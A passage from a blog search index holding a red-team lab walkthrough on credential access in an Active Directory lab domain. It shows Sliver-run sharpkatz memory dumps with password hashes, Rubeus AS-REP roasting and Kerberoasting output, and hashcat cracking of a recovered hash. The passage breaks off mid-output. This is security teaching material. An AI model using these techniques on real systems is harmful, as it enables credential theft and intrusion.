<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>3. Credentials Access</title>
      <link href="https://mmnoureldin.github.io/Red-Team/2023/04/03/Credentials-Access/"/>
      <url>https://mmnoureldin.github.io/Red-Team/2023/04/03/Credentials-Access/</url>
      
        <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Through this post we are building on the previous posts, where we had achieved an initial access and system level privilege escalation on one of the targets.<br>This post will introduce different techniques for credentials access.</p><img src="https://mmnoureldin.github.io/Red-Team/2023/04/03/Credentials-Access/mindmap.png" class=""><h2 id="Memory-dumping"><a href="#Memory-dumping" class="headerlink" title="Memory dumping"></a>Memory dumping</h2><p>After gaining <code>system</code> user privilege on <code>castelblack</code> we can dump credentials from memory using <code>sharpkatz</code>:</p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br></pre></td><td class="code"><pre><span class="line">sliver (REAL_ROBIN) &gt; sharpkatz </span><br><span class="line"></span><br><span class="line">[*] sharpkatz output:</span><br><span class="line">[*]</span><br><span class="line">[*] System Information</span><br><span class="line">[*] ----------------------------------------------------------------------</span><br><span class="line">[*] | Platform: Win32NT                                                  |</span><br><span class="line">[*] ----------------------------------------------------------------------</span><br><span class="line">[*] | Major: 10            | Minor: 0             | Build: 17763         |</span><br><span class="line">[*] ----------------------------------------------------------------------</span><br><span class="line">[*] | Version: Microsoft Windows NT 10.0.17763.0                         |</span><br><span class="line">[*] ----------------------------------------------------------------------</span><br><span class="line">[*]</span><br><span class="line">[*] Authentication Id: 0;427549 (00000000:00427549)</span><br><span class="line">[*] Session: Service from 0</span><br><span class="line">[*] UserName: DefaultAppPool</span><br><span class="line">[*] LogonDomain: IIS APPPOOL</span><br><span class="line">[*] LogonServer: </span><br><span class="line">[*] LogonTime: 2023/03/08 00:47:35</span><br><span class="line">[*] SID: S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415</span><br><span class="line">[*]</span><br><span class="line">[*] Msv</span><br><span class="line">[*]  Domain   : NORTH</span><br><span class="line">[*]  Username : CASTELBLACK$</span><br><span class="line">[*]  LM       : 00000000000000000000000000000000</span><br><span class="line">[*]  NTLM     : 8962fcf61a771019bb4e9419f631c6b7</span><br><span class="line">[*]  SHA1     : ed334359e08149f89ca46ca7a26ae4ab582b7696</span><br><span class="line">[*]  DPAPI    : 00000000000000000000000000000000</span><br><span class="line">[*]</span><br><span class="line">[*] WDigest</span><br><span class="line">[*]  Hostname : NORTH </span><br><span class="line">[*]  Username : CASTELBLACK$ </span><br><span class="line">[*]  Password : [NULL]</span><br><span class="line">[*]</span><br><span class="line">[*] Kerberos</span><br><span class="line">[*]  Domain   : north.sevenkingdoms.local </span><br><span class="line">[*]  Username : CASTELBLACK$ </span><br><span class="line">[*]  Password : 9&amp;e8Lhs$bm,\aH*M@FG_L4Ga!Jj&#x27;&quot;,maAho*c1&amp;h[gl!2ZdsdEN)5tt`QEn3D7$-VjM =%PA$PLN&lt;kSALWQ4;!ZX#o+ErOVk&lt;fE^^aq[5#0P&quot;`6*&quot;U.-(0*.</span><br><span class="line">[*]</span><br><span class="line">[*] Authentication Id: 0;103697 (00000000:00103697)</span><br><span class="line">[*] Session: Service from 0</span><br><span class="line">[*] UserName: SQLTELEMETRY$SQLEXPRESS</span><br><span class="line">[*] LogonDomain: NT Service</span><br><span class="line">[*] LogonServer: </span><br><span class="line">[*] LogonTime: 2023/03/08 00:38:00</span><br><span class="line">[*] SID: S-1-5-80-1985561900-798682989-2213159822-1904180398-3434236965</span><br><span class="line">[*]</span><br><span class="line">[*] Msv</span><br><span class="line">[*]  Domain   : NORTH</span><br><span class="line">[*]  Username : CASTELBLACK$</span><br><span class="line">[*]  LM       : 00000000000000000000000000000000</span><br><span class="line">[*]  NTLM     : 8962fcf61a771019bb4e9419f631c6b7</span><br><span class="line">[*]  SHA1     : ed334359e08149f89ca46ca7a26ae4ab582b7696</span><br><span class="line">[*]  DPAPI    : 00000000000000000000000000000000</span><br><span class="line">[*]</span><br><span class="line">[*] WDigest</span><br><span class="line">[*]  Hostname : NORTH </span><br><span class="line">[*]  Username : CASTELBLACK$ </span><br><span class="line">[*]  Password : [NULL]</span><br><span class="line">[*]</span><br><span class="line">[*] Kerberos</span><br><span class="line">[*]  Domain   : north.sevenkingdoms.local </span><br><span class="line">[*]  Username : CASTELBLACK$ </span><br><span class="line">[*]  Password : 9&amp;e8Lhs$bm,\aH*M@FG_L4Ga!Jj&#x27;&quot;,maAho*c1&amp;h[gl!2ZdsdEN)5tt`QEn3D7$-VjM =%PA$PLN&lt;kSALWQ4;!ZX#o+ErOVk&lt;fE^^aq[5#0P&quot;`6*&quot;U.-(0*.</span><br><span class="line">[*]</span><br><span class="line">[*] Authentication Id: 0;103528 (00000000:00103528)</span><br><span class="line">[*] Session: Service from 0</span><br><span class="line">[*] UserName: sql_svc</span><br><span class="line">[*] LogonDomain: NORTH</span><br><span class="line">[*] LogonServer: WINTERFELL</span><br><span class="line">[*] LogonTime: 2023/03/08 00:38:00</span><br><span class="line">[*] SID: S-1-5-21-1463460949-1766931997-624310855-1121</span><br><span class="line">[*]</span><br><span class="line">[*] Msv</span><br><span class="line">[*]  Domain   : NORTH</span><br><span class="line">[*]  Username : sql_svc</span><br><span class="line">[*]  LM       : 00000000000000000000000000000000</span><br><span class="line">[*]  NTLM     : 84a5092f53390ea48d660be52b93b804</span><br><span class="line">[*]  SHA1     : 9fd961155e28b1c6f9b3859f32f4779ad6a06404</span><br><span class="line">[*]  DPAPI    : 1eda60fb7469fc282c6a44e4d6a06e31</span><br><span class="line">[*]</span><br><span class="line">[*] WDigest</span><br><span class="line">[*]  Hostname : NORTH </span><br><span class="line">[*]  Username : sql_svc </span><br><span class="line">[*]  Password : [NULL]</span><br><span class="line">[*]</span><br><span class="line">[*] Kerberos</span><br><span class="line">[*]  Domain   : NORTH.SEVENKINGDOMS.LOCAL </span><br><span class="line">[*]  Username : sql_svc </span><br><span class="line">[*]  Password : [NULL]</span><br><span class="line">[*]</span><br><span class="line">[*] Authentication Id: 0;66062 (00000000:00066062)</span><br><span class="line">[*] Session: Interactive from 1</span><br><span class="line">[*] UserName: DWM-1</span><br><span class="line">[*] LogonDomain: Window Manager</span><br><span class="line">[*] LogonServer: </span><br><span class="line">[*] LogonTime: 2023/03/08 00:37:59</span><br><span class="line">[*] SID: S-1-5-90-0-1</span><br><span class="line">[*]</span><br><span class="line">[*] Msv</span><br><span class="line">[*]  Domain   : NORTH</span><br><span class="line">[*]  Username : CASTELBLACK$</span><br><span class="line">[*]  LM       : 00000000000000000000000000000000</span><br><span class="line">[*]  NTLM     : 8962fcf61a771019bb4e9419f631c6b7</span><br><span class="line">[*]  SHA1     : ed334359e08149f89ca46ca7a26ae4ab582b7696</span><br><span class="line">[*]  DPAPI    : 00000000000000000000000000000000</span><br><span class="line">[*]</span><br><span class="line">[*] WDigest</span><br><span class="line">[*]  Hostname : NORTH </span><br><span class="line">[*]  Username : CASTELBLACK$ </span><br><span class="line">[*]  Password : [NULL]</span><br><span class="line">[*]</span><br><span class="line">[*] Kerberos</span><br><span class="line">[*]  Domain   : north.sevenkingdoms.local </span><br><span class="line">[*]  Username : CASTELBLACK$ </span><br><span class="line">[*]  Password : 9&amp;e8Lhs$bm,\aH*M@FG_L4Ga!Jj&#x27;&quot;,maAho*c1&amp;h[gl!2ZdsdEN)5tt`QEn3D7$-VjM =%PA$PLN&lt;kSALWQ4;!ZX#o+ErOVk&lt;fE^^aq[5#0P&quot;`6*&quot;U.-(0*.</span><br><span class="line">[*]</span><br><span class="line">[*] Authentication Id: 0;66003 (00000000:00066003)</span><br><span class="line">[*] Session: Interactive from 1</span><br><span class="line">[*] UserName: DWM-1</span><br><span class="line">[*] LogonDomain: Window Manager</span><br><span class="line">[*] LogonServer: </span><br><span class="line">[*] LogonTime: 2023/03/08 00:37:59</span><br><span class="line">[*] SID: S-1-5-90-0-1</span><br><span class="line">[*]</span><br><span class="line">[*] Msv</span><br><span class="line">[*]  Domain   : NORTH</span><br><span class="line">[*]  Username : CASTELBLACK$</span><br><span class="line">[*]  LM       : 00000000000000000000000000000000</span><br><span class="line">[*]  NTLM     : 8962fcf61a771019bb4e9419f631c6b7</span><br><span class="line">[*]  SHA1     : ed334359e08149f89ca46ca7a26ae4ab582b7696</span><br><span class="line">[*]  DPAPI    : 00000000000000000000000000000000</span><br><span class="line">[*]</span><br><span class="line">[*] WDigest</span><br><span class="line">[*]  Hostname : NORTH </span><br><span class="line">[*]  Username : CASTELBLACK$ </span><br><span class="line">[*]  Password : [NULL]</span><br><span class="line">[*]</span><br><span class="line">[*] Kerberos</span><br><span class="line">[*]  Domain   : north.sevenkingdoms.local </span><br><span class="line">[*]  Username : CASTELBLACK$ </span><br><span class="line">[*]  Password : 9&amp;e8Lhs$bm,\aH*M@FG_L4Ga!Jj&#x27;&quot;,maAho*c1&amp;h[gl!2ZdsdEN)5tt`QEn3D7$-VjM =%PA$PLN&lt;kSALWQ4;!ZX#o+ErOVk&lt;fE^^aq[5#0P&quot;`6*&quot;U.-(0*.</span><br><span class="line">[*]</span><br><span class="line">[*] Authentication Id: 0;996 (00000000:00000996)</span><br><span class="line">[*] Session: Service from 0</span><br><span class="line">[*] UserName: CASTELBLACK$</span><br><span class="line">[*] LogonDomain: NORTH</span><br><span class="line">[*] LogonServer: </span><br><span class="line">[*] LogonTime: 2023/03/08 00:37:59</span><br><span class="line">[*] SID: S-1-5-20</span><br><span class="line">[*]</span><br><span class="line">[*] Msv</span><br><span class="line">[*]  Domain   : NORTH</span><br><span class="line">[*]  Username : CASTELBLACK$</span><br><span class="line">[*]  LM       : 00000000000000000000000000000000</span><br><span class="line">[*]  NTLM     : 8962fcf61a771019bb4e9419f631c6b7</span><br><span class="line">[*]  SHA1     : ed334359e08149f89ca46ca7a26ae4ab582b7696</span><br><span class="line">[*]  DPAPI    : 00000000000000000000000000000000</span><br><span class="line">[*]</span><br><span class="line">[*] WDigest</span><br><span class="line">[*]  Hostname : NORTH </span><br><span class="line">[*]  Username : CASTELBLACK$ </span><br><span class="line">[*]  Password : [NULL]</span><br><span class="line">[*]</span><br><span class="line">[*] Kerberos</span><br><span class="line">[*]  Domain   : NORTH.SEVENKINGDOMS.LOCAL </span><br><span class="line">[*]  Username : castelblack$ </span><br><span class="line">[*]  Password : [NULL]</span><br><span class="line">[*]</span><br><span class="line">[*] Authentication Id: 0;44322 (00000000:00044322)</span><br><span class="line">[*] Session: Interactive from 0</span><br><span class="line">[*] UserName: UMFD-0</span><br><span class="line">[*] LogonDomain: Font Driver Host</span><br><span class="line">[*] LogonServer: </span><br><span class="line">[*] LogonTime: 2023/03/08 00:37:59</span><br><span class="line">[*] SID: S-1-5-96-0-0</span><br><span class="line">[*]</span><br><span class="line">[*] Msv</span><br><span class="line">[*]  Domain   : NORTH</span><br><span class="line">[*]  Username : CASTELBLACK$</span><br><span class="line">[*]  LM       : 00000000000000000000000000000000</span><br><span class="line">[*]  NTLM     : 8962fcf61a771019bb4e9419f631c6b7</span><br><span class="line">[*]  SHA1     : ed334359e08149f89ca46ca7a26ae4ab582b7696</span><br><span class="line">[*]  DPAPI    : 00000000000000000000000000000000</span><br><span class="line">[*]</span><br><span class="line">[*] WDigest</span><br><span class="line">[*]  Hostname : NORTH </span><br><span class="line">[*]  Username : CASTELBLACK$ </span><br><span class="line">[*]  Password : [NULL]</span><br><span class="line">[*]</span><br><span class="line">[*] Kerberos</span><br><span class="line">[*]  Domain   : north.sevenkingdoms.local </span><br><span class="line">[*]  Username : CASTELBLACK$ </span><br><span class="line">[*]  Password : 9&amp;e8Lhs$bm,\aH*M@FG_L4Ga!Jj&#x27;&quot;,maAho*c1&amp;h[gl!2ZdsdEN)5tt`QEn3D7$-VjM =%PA$PLN&lt;kSALWQ4;!ZX#o+ErOVk&lt;fE^^aq[5#0P&quot;`6*&quot;U.-(0*.</span><br><span class="line">[*]</span><br><span class="line">[*] Authentication Id: 0;44262 (00000000:00044262)</span><br><span class="line">[*] Session:  from 0</span><br><span class="line">[*] UserName: CASTELBLACK$</span><br><span class="line">[*] LogonDomain: </span><br><span class="line">[*] LogonServer: </span><br><span class="line">[*] LogonTime: 1601/01/01 02:00:00</span><br><span class="line">[*] SID: </span><br><span class="line">[*]</span><br><span class="line">[*] WDigest</span><br><span class="line">[*]  Hostname : NORTH </span><br><span class="line">[*]  Username : CASTELBLACK$ </span><br><span class="line">[*]  Password : [NULL]</span><br><span class="line">[*]</span><br><span class="line">[*] Kerberos</span><br><span class="line">[*]  Domain   : north.sevenkingdoms.local </span><br><span class="line">[*]  Username : CASTELBLACK$ </span><br><span class="line">[*]  Password : 9&amp;e8Lhs$bm,\aH*M@FG_L4Ga!Jj&#x27;&quot;,maAho*c1&amp;h[gl!2ZdsdEN)5tt`QEn3D7$-VjM =%PA$PLN&lt;kSALWQ4;!ZX#o+ErOVk&lt;fE^^aq[5#0P&quot;`6*&quot;U.-(0*.</span><br><span class="line">[*]</span><br><span class="line">[*] Authentication Id: 0;999 (00000000:00000999)</span><br><span class="line">[*] Session:  from 0</span><br><span class="line">[*] UserName: castelblack$</span><br><span class="line">[*] LogonDomain: </span><br><span class="line">[*] LogonServer: </span><br><span class="line">[*] LogonTime: 1601/01/01 02:00:00</span><br><span class="line">[*] SID: </span><br><span class="line">[*]</span><br><span class="line">[*] WDigest</span><br><span class="line">[*]  Hostname : NORTH </span><br><span class="line">[*]  Username : CASTELBLACK$ </span><br><span class="line">[*]  Password : [NULL]</span><br><span class="line">[*]</span><br><span class="line">[*] Kerberos</span><br><span class="line">[*]  Domain   : NORTH.SEVENKINGDOMS.LOCAL </span><br><span class="line">[*]  Username : castelblack$ </span><br><span class="line">[*]  Password : [NULL]</span><br><span class="line">[*]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>We were able to find the account <code>sql_svc</code> hash <code>84a5092f53390ea48d660be52b93b804</code> among other hashes.</p><h2 id="ASReproasting"><a href="#ASReproasting" class="headerlink" title="ASReproasting"></a>ASReproasting</h2><p>Checking if a domain user does not have Kerberos preauthentication enabled.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">sliver (REAL_ROBIN) &gt; rubeus  asreproast /format:hashcat /domain:north.sevenkingdoms.local /nowrap</span><br><span class="line"></span><br><span class="line">[*] rubeus output:</span><br><span class="line"></span><br><span class="line">   ______        _                      </span><br><span class="line">  (_____ \      | |                     </span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___ </span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.0.1 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: AS-REP roasting</span><br><span class="line"></span><br><span class="line">[*] Target Domain          : north.sevenkingdoms.local</span><br><span class="line"></span><br><span class="line">[*] Searching path &#x27;LDAP://winterfell.north.sevenkingdoms.local/DC=north,DC=sevenkingdoms,DC=local&#x27; for &#x27;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&#x27;</span><br><span class="line">[*] SamAccountName         : brandon.stark</span><br><span class="line">[*] DistinguishedName      : CN=brandon.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local</span><br><span class="line">[*] Using domain controller: winterfell.north.sevenkingdoms.local (192.168.24.11)</span><br><span class="line">[*] Building AS-REQ (w/o preauth) for: &#x27;north.sevenkingdoms.local\brandon.stark&#x27;</span><br><span class="line">[+] AS-REQ w/o preauth successful!</span><br><span class="line">[*] AS-REP hash:</span><br><span class="line"></span><br><span class="line">      $krb5asrep$23$brandon.stark@north.sevenkingdoms.local:630E0BFBA9A62EDEB4F119823A037E3C$DFB26233F0EF839793B7A2C8C6EB173A05218DA54E8CFDDFA7A726AB7831B113FC3257A71FE5E931D12BA020A68DE9CD83C28D2CD73BDD2C8A7473604D084984A2A0B177B35D1AEAFAA70874D4D6F55A9BBB80B1074894336907EF3FC7C8FCFC3F8B84511FAFE0229C076ADA8D97C83BB31051022598DE1EEEE10EA261E423DA80009D7AD041606F5FD9C384F974F608F41A266B4402EFD15923614CF855740FD98AC7DA75C27573DE2413A4297446B6550BD4D65F1B6526763CEA3E30F325E746A4E2B79D9DA5DB3955F0B47958ED9D50F3C4477CB6AC02E6C27133660CF3B24A234B0E0A6857CFC8681E0B5667C6C424DB55986850A3793B17A53F86BFB4FE88F85C2AF22F</span><br></pre></td></tr></table></figure><p>We got user <code>brandon.stark</code> AS_REP message, let’s use hashcat to crack it.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat -m 18200 --force -a 0 /tmp/arep.txt Documents/rockyou.txt</span><br><span class="line"></span><br><span class="line">$krb5asrep$23<span class="variable">$brandon</span>.stark@north.sevenkingdoms.local:630e0bfba9a62edeb4f119823a037e3c<span class="variable">$dfb26233f0ef839793b7a2c8c6eb173a05218da54e8cfddfa7a726ab7831b113fc3257a71fe5e931d12ba020a68de9cd83c28d2cd73bdd2c8a7473604d084984a2a0b177b35d1aeafaa70874d4d6f55a9bbb80b1074894336907ef3fc7c8fcfc3f8b84511fafe0229c076ada8d97c83bb31051022598de1eeee10ea261e423da80009d7ad041606f5fd9c384f974f608f41a266b4402efd15923614cf855740fd98ac7da75c27573de2413a4297446b6550bd4d65f1b6526763cea3e30f325e746a4e2b79d9da5db3955f0b47958ed9d50f3c4477cb6ac02e6c27133660cf3b24a234b0e0a6857cfc8681e0b5667c6c424db55986850a3793b17a53f86bfb4fe88f85c2af22f</span>:iseedeadpeople</span><br></pre></td></tr></table></figure><p>User <code>brandon.stark</code> is found with password <code>iseedeadpeople</code>.</p><h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><p>Checking if there are any SPNs with weak password.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">sliver (REAL_ROBIN) &gt; rubeus  kerberoast /domain:north.sevenkingdoms.local /nowrap</span><br><span class="line"></span><br><span class="line">[*] rubeus output:</span><br><span class="line"></span><br><span class="line">   ______        _                      </span><br><span class="line">  (_____ \      | |                     </span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___ </span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.0.1 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: Kerberoasting</span><br><span class="line"></span><br><span class="line">[*] NOTICE: AES hashes will be returned for AES-enabled accounts.</span><br><span class="line">[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.</span><br><span class="line"></span><br><span class="line">[*] Target Domain          : north.sevenkingdoms.local</span><br><span class="line">[*] Searching path &#x27;LDAP://winterfell.north.sevenkingdoms.local/DC=north,DC=sevenkingdoms,DC=local&#x27; for &#x27;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&#x27;</span><br><span class="line"></span><br><span class="line">[*] Total kerberoastable users : 2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] SamAccountName         : jon.snow</span><br><span class="line">[*] DistinguishedName      : CN=jon.snow,CN=Users,DC=north,DC=sevenkingdoms,DC=local</span><br><span class="line">[*] ServicePrincipalName   : CIFS/winterfell.north.sevenkingdoms.local</span><br><span class="line">[*] PwdLastSet             : 3/7/2023 9:04:06 PM</span><br><span class="line">[*] Supported ETypes       : RC4_HMAC_DEFAULT</span><br><span class="line">[*] Hash                   : $krb5tgs$23$*jon.snow$north.sevenkingdoms.local$CIFS/winterfell.north.sevenkingdoms.local@north.sevenkingdoms.local*$8EF414D681E524F03C47F7435AF5989E$200C6CDFD190F0244B49032D3ECE955EABD7FBEFF02BE962579675B52EA16964E09B81FF9B1438BC528C54C3B64D26465D0F9B396496FC2F5BA43FEB2F1A86A2BBB5EACC7727A443FD93815B4EF8E52336D3F2C04680F83798C9AB066930253D939DA7CB84A3208AE985E23003F224432C3D57ECEB3434B049B62F83ECB5C1E4CCD73A483B76F5A8BB56486DC21D0818987F9FA769641C943BCA2436A5DE1E840DBE756F736DEFAE6F5957A4133C853954B6D851B0794CB709697BA1865252B298A00C17BEC7538F5E5CA1BA19CF12B23144B190D250BC0340ACB5EB71671DC834025C28615EE67ED46DDDD3198C22563E1423F4B4D42EF0A9090F90B249FF474808027277AA27BD7975A46BA953DF15710B4474310A83299F75AAC4AD308851C1DCCBA55D60F6E640A62F2B7883642DE0F9E0A260C443A505B4EB105016729A281E112917CD61945EB77D0AED0ADCA9DB7676D11A718490E0F85AA8EFB4A2A2C89A4674F574FB0B74D4D7CF2AB0977FEC6F9822883AD1F57B35AAEDC4F06A24C9563F08D0078B36BF86E19C62B3EA5C310491D01FE340E57A0E21AF4D1CCB29CB1FEA209EE6250603162E55DF4744C3527ED256CEA9B2302768CA6045F153BC10AD22C25DF3776CB3F19ED471799F69F4EA799C200838D08313900D0CBD6B1695B1222A6815D7005D5DE2B2293169509B0FD2343F9F04722EA8CE0C96F982AC5925F89604AB41307CE6077D78B8212DE6676A83C706365B33FEB1B000EDA6780BD31453CD71C35002F6D978C3B2CA71FBD34D06B20BC223F56F966467086EA2794D86C4333A79594797E88FAC36C4A7519A18A522B011E72110DD07BC5AB7FF52D29BFBAB36D2C57D763EAE9BE83E978E4B1CAF1F3BD6CF19E3899219E3BB96D6736F3479386734CF822AAB53CEB343C60839633BF72D5AF71F409EF04316364D8CA4A80745541BE4B933B1FE0258C8857B5B62D0C4E589C09D57C02338514E56F9C2CC3E1A7F14B4FBD880FFBD2162EE38F3F8A67FB3B7FD38EEDE132C13C433634B7DF4A9EBAE23C9A48B62FEA9BFF2654740078B5A6BD5A27B90AC5C7CD5549C9DF0C02C3CC6EB91416DC8C2D5B119CCC7E2E240B3D2C0F97EF0CA454EEA8B762FE8D90D5286C26174BDE87793BEF12DFF317A77804128521173209EE1093EA665BF16C9364036AB3EC0017902E816943918F086EC4DCC29E394485A78FB1FFB24521A640032086B9356393E5696A71A63A393DDF00725615E990BDCD59962A7C66C81192F566805544020735000052EFFEB9726A1F30797F2DC28F404E1F696FD9FE3C37C52949ED767C4DB732B78A05534E748DF33E8C3BC51A47A2C28206A90DAC77D5CC7D2410898F9C4C9B7548640D6F43D33C46FDFF6B973A580904C055B53B8635767E161AB1705D635B8A406874DFE17BCCE0489E5DFA6822FD2D8C76DC910717EA84B53ED07940DF5FF38E6F6F3C3BA7AD490E969AEEB0F103C41B12D4789FE557673F12CD4E86A8E5BBB086B5070EBFB1BF62ADBE237EC6C159B24EBADE43354E59C040E61DBB47D714F383B30317807C9186C02450C4B61F773C88C10B43E992F</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] 